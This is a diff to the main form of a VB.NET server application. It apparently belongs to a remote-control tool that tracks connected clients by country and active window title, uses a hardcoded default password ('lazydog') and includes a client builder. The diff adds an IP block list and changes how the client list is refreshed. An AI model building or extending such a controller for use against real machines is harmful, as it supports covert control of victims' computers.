@@ -28,6 +28,31 @@ Public Class frmmain
     End Function
 #End Region
 
+#Region "Block IP Address"
+    Private Sub RefreshBLockIPListBox()
+        lsBlockIP.Items.Clear()
+        For Each ip As IPAddress In mSettings.ServerSetting.blockIPList
+            lsBlockIP.Items.Add(ip.ToString())
+        Next
+    End Sub
+
+    Private Sub AddBlockIPAddress(ByVal str_ip As String)
+        Dim ipAddr As IPAddress = Nothing
+        If IPAddress.TryParse(str_ip, ipAddr) Then
+            If mSettings.ServerSetting.blockIPList.Contains(ipAddr) = False Then
+                mSettings.ServerSetting.blockIPList.Add(ipAddr)
+                lsBlockIP.Items.Add(ipAddr.ToString())
+            End If
+        End If
+    End Sub
+
+    Private Sub RemoveBlockIPAddress(ByVal str_ip As String)
+        Dim ipAddr As IPAddress = IPAddress.Parse(str_ip)
+        mSettings.ServerSetting.blockIPList.Remove(ipAddr)
+        lsBlockIP.Items.Remove(ipAddr.ToString)
+    End Sub
+#End Region
+
     Public Sub Log(ByVal txt As String)
         If txtLog.InvokeRequired Then
             Dim d As New SafeLog(AddressOf Log)
@@ -42,7 +67,7 @@ Public Class frmmain
             .View = View.Details
             .GridLines = True
             .FullRowSelect = True
-            .Sorting = SortOrder.Ascending
+            .Sorting = SortOrder.None
             .MultiSelect = False
             .HideSelection = False
             .SmallImageList = ImFlag
@@ -65,6 +90,7 @@ Public Class frmmain
                 .Port = 6969
                 .isListening = False
                 .password = "lazydog"
+                .blockIPList = New List(Of IPAddress)
             End With
         End If
         Return True
@@ -83,11 +109,20 @@ Public Class frmmain
             If listener.Server IsNot Nothing Then
                 If listener.Server.IsBound = True Then
                     Dim clientTCP As TcpClient = listener.EndAcceptTcpClient(ar)
-                    Dim clientObj As clsClientObj = New clsClientObj(clientTCP, mSettings.ServerSetting.password)
+                    Dim IP As IPEndPoint = clientTCP.Client.RemoteEndPoint
+                    If mSettings.ServerSetting.blockIPList.Contains(IP.Address) = False Then
+                        Dim clientObj As clsClientObj = New clsClientObj(clientTCP, mSettings.ServerSetting.password)
 
-                    Log("There is a new connection from " & clientTCP.Client.RemoteEndPoint.ToString())
-                    clientMgr.RegisterClient(clientObj)
-                    Threading.Thread.Sleep(1)
+                        Log("There is a new connection from " & clientTCP.Client.RemoteEndPoint.ToString())
+                        clientMgr.RegisterClient(clientObj)
+                        Threading.Thread.Sleep(1)
+                    Else
+                        clientTCP.Client.Shutdown(SocketShutdown.Both)
+                        clientTCP.Client.Disconnect(False)
+                        clientTCP.Close()
+
+                        'Log("Block IP address: " & IP.Address.ToString())
+                    End If
                     serverTCP.BeginAcceptTcpClient(New AsyncCallback(AddressOf AcceptClientCallBack), serverTCP)
                 End If
             End If
@@ -136,6 +171,7 @@ Public Class frmmain
         data(5) = clientInfo.WindowTitle
         Dim itm As ListViewItem = New ListViewItem(data)
         itm.ImageIndex = GetIndexByCountryCode(clientInfo.countryCode)
+        'lvClient.Items.Insert(lvClient.Items.Count, itm)
         lvClient.Items.Add(itm)
         Return True
     End Function
@@ -204,14 +240,9 @@ Public Class frmmain
         Dim ClientList As List(Of clsClientObj) = clientMgr.GetAcceptedClientList()
 
         If ClientList.Count > lvClient.Items.Count Then
-            Dim i As Integer = 0
-            For Each ClientObj As clsClientObj In ClientList
-                If i < lvClient.Items.Count Then
-                    UpdateClientToListview(ClientObj, i)
-                    i += 1
-                Else
-                    AddClientToListview(ClientObj)
-                End If
+            Dim i As Integer
+            For i = lvClient.Items.Count To ClientList.Count - 1
+                AddClientToListview(ClientList(i))
             Next
         ElseIf ClientList.Count < lvClient.Items.Count Then
             If ClientList.Count = 0 Then
@@ -398,6 +429,17 @@ Public Class frmmain
                     txtBuildLog.Text += "[-] Failed to save file" & vbCrLf
                 End If
             End If
+        End If
+    End Sub
+
+    Private Sub txtBlockIPAdd_Click(sender As Object, e As EventArgs) Handles txtBlockIPAdd.Click
+        AddBlockIPAddress(txtBlockIP.Text)
+        txtBlockIP.Text = ""
+    End Sub
+
+    Private Sub cmdRemoveBlockIP_Click(sender As Object, e As EventArgs) Handles cmdRemoveBlockIP.Click
+        If lsBlockIP.SelectedIndex <> -1 Then
+            RemoveBlockIPAddress(lsBlockIP.SelectedItem)
         End If
     End Sub
 End Class
